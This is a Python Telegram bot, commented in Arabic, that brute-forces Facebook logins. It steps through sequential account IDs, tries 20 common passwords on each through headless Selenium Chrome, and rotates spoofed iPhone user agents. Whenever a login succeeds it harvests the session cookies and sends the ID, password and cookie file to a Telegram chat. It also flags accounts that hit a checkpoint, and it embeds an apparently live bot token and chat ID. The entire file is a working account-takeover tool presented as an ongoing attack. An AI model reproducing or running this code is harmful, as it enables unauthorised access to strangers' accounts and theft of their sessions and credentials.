import telebot
import time
import os
import random
import json
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

TOKEN = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc"
bot = telebot.TeleBot(TOKEN)
CHAT_ID = "1879021873" # تأكد من وضع ID حسابك هنا لتصلك النتائج فوراً

# قائمة كلمات السر (20 كلمة مستوحاة من 2004-2005)
PASSWORDS = [
    "123456", "123456789", "1234567", "password", "12345", "12345678",
    "qwerty", "112233", "jasser", "123123", "000000", "1234", "654321",
    "iloveyou", "admin", "1234567890", "123321", "monkey", "0123456789", "p@ssword"
]

# قائمة بصمات أجهزة آيفون متنوعة
USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/106.0.5249.92 Mobile/15E148 Safari/604.1"
]

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "🚀 انطلق الهجوم المستمر 24/24...\nسأقوم بفحص المعرفات وإرسال الناجح فقط مع الكوكيز.")
    run_brute_force(message.chat.id)

def run_brute_force(chat_id):
    current_id = 1430771423 # المعرف الذي تبدأ منه
    
    while True:
        for password in PASSWORDS:
            ua = random.choice(USER_AGENTS)
            opts = Options()
            opts.add_argument("--headless")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument(f'user-agent={ua}')
            
            driver = webdriver.Chrome(options=opts)
            driver.set_page_load_timeout(30)
            
            try:
                driver.get("https://m.facebook.com/login/")
                time.sleep(random.uniform(2, 4))
                
                driver.find_element(By.NAME, "email").send_keys(str(current_id))
                driver.find_element(By.NAME, "pass").send_keys(password)
                
                try:
                    driver.find_element(By.NAME, "login").click()
                except:
                    driver.execute_script("document.querySelector('button[name=\"login\"]').click();")
                
                time.sleep(10)
                
                # التحقق من نجاح الدخول (إذا لم نعد في صفحة الدخول)
                if "login" not in driver.current_url and "checkpoint" not in driver.current_url:
                    if "facebook.com" in driver.current_url:
                        # سحب الكوكيز
                        cookies = driver.get_cookies()
                        cookie_str = json.dumps(cookies)
                        
                        success_msg = f"✅ تم صيد حساب!\n🆔 ID: {current_id}\n🔑 Pass: {password}\n🔗 URL: {driver.current_url}\n🍪 Cookies: {cookie_str[:200]}..."
                        bot.send_message(chat_id, success_msg)
                        
                        # حفظ الكوكيز في ملف وإرساله
                        with open("cookies.json", "w") as f:
                            json.dump(cookies, f)
                        with open("cookies.json", "rb") as f:
                            bot.send_document(chat_id, f, caption=f"Cookies for ID: {current_id}")
                
                elif "checkpoint" in driver.current_url:
                    bot.send_message(chat_id, f"⚠️ حساب بنقطة تفتيش: {current_id} | {password}")

            except Exception as e:
                print(f"Error on {current_id}: {str(e)[:50]}")
            
            finally:
                driver.quit()
                time.sleep(random.uniform(1, 3)) # راحة قصيرة قبل المحاولة التالية
        
        current_id += 1 # الانتقال للمعرف التالي بعد تجربة كل كلمات السر

bot.infinity_polling()
